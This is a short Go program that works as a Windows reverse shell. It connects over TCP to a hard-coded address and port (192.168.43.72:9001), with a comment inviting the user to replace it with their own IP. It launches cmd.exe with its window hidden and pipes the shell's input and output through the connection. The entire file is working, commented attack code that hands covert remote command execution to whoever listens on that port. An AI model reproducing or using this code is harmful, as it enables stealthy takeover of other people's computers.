package main

import (
	"net"     // Package for network I/O, provides Dial function
	"os/exec" // Package for executing external commands
	"syscall" // Package for system call utilities, used for setting process attributes
)

func main() {
	// Establish a TCP connection to the specified IP address and port
	// Replace with your IP address.
	connection, _ := net.Dial("tcp", "192.168.43.72:9001")

	// Create a new command that runs the Windows command prompt
	cmd := exec.Command("cmd")

	// Set the command's system process attributes to hide the console window
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	// Redirect the command's standard input, output, and error to the established connection
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection

	// Run the command
	cmd.Run()
}
